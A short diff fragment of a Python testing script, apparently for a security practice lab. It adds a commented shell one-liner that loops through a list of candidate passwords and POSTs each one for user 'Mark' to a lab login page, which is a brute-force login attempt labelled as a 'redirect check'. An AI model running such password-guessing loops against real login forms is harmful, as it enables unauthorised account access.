@@ -17,3 +17,7 @@ def generate_input_data():
 
 if __name__ == "__main__":
     get_response_code(generate_input_data())
+
+# simple redirect check using a list of parameters
+# for key in $(cat list); do printf "\n[i] param: "$key"\n" >&2; curl -v http://10.112.167.162/labs/lab1/index.php -H "Content-Type: application/x-www-form-urlencoded" -d "username=Mark&password="$key; done 2>> "post_delay_$(date +%Y%m%dT%H%M%SZ).log"
+#
